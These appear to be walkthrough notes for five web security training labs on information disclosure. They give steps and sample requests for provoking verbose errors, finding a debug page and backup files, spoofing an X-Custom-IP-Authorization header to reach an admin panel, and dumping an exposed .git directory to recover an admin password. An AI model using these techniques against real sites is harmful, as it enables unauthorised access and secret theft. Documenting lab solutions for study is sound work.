- [Information disclosure in error messages](# Information disclosure in error messages)
- [Information disclosure on debug page](# Information disclosure on debug page)
- [Source code disclosure via backup files](# Source code disclosure via backup files)
- [Authentication bypass via information disclosure](# Authentication bypass via information disclosure)
- [Information disclosure in version control history](# Information disclosure in version control history)
***
# Information disclosure in error messages
1. Navigate to product page
2. Submit special character in `productId` parameter
```
GET /product?productId='
```
3. `500 ERROR` returned
4. Read response to obtain framework information
# Information disclosure on debug page
1. View HTML source of home page
```html
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```
1. Debug page disclosed in HTML comment
2. Navigate to debug page `/cgi-bin/php.info`
3. Extract `SECRET_KEY` value
# Source code disclosure via backup files
1. In Burp:  Target > Right-click target > Engagement Tools > Discover Content
2. `/backup` is discovered and references `/backup/ProductTemplate.java.bak`
3. Read HTTP response and identify `ConnectionBuilder` variable and extract secret key
# Authentication bypass via information disclosure
1. In Burp:  Target > Right-click target > Engagement Tools > Discover Content
2. Normal access to `/admin` returns `401`
3. Send `TRACE` method request to `/admin` and identify `X-Custom-IP-Authorization:` header being used
4. Construct `GET` request to admin using `127.0.0.1` as the IP address for the custom header
```
GET /admin/delete?username=carlos HTTP/2
Host: ...<SNIP>...
X-Custom-Ip-Authorization: 127.0.0.1
```
# Information disclosure in version control history
1. Discover content using `feroxbuster`
```sh
feroxbuster -u https://...<SNIP>....web-security-academy.net/ -w /opt/seclists/Discovery/Web-Content/raft-medium-words.txt --silent
```
2. Identify `.git` directory
3. Use https://github.com/arthaud/git-dumper to dump the `git` repository from the target
```sh
./git_dumper.py https://...<SNIP>....web-security-academy.net/ ~/website
```
4. Go to output directory and do a `git log`
5. Second commit says "Remove admin password from config"
6. Read information from the first git commit
```sh
git show <COMMIT_HASH>
```
7. Read `+ADMIN_PASSWORD` from the commit
8. Authenticate as admin > Delete Carlos
